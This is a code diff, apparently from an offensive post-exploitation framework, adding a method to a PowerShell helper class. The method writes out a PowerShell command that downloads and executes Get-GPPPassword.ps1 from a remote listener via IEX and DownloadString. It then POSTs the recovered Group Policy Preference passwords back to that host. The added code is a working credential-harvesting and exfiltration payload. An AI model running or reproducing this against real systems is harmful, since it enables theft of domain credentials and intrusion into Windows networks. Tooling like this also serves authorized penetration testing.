@@ -52,6 +52,25 @@ class PowerShell:
 
         return ps_command(command)
 
+    def gpp_passwords(self):
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Get-GPPPassword.ps1');
+        $output = Get-{func_name} | Out-String;
+        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
+        $request.Method = 'POST';
+        $request.ContentType = 'application/x-www-form-urlencoded';
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($output);
+        $request.ContentLength = $bytes.Length;
+        $requestStream = $request.GetRequestStream();
+        $requestStream.Write( $bytes, 0, $bytes.Length );
+        $requestStream.Close();
+        $request.GetResponse();""".format(protocol=self.protocol,
+                                          func_name=self.func_name,
+                                          port=settings.args.server_port,
+                                          addr=self.localip)
+
+        return ps_command(command)
+
     def powerview(self, command):
 
         command = """
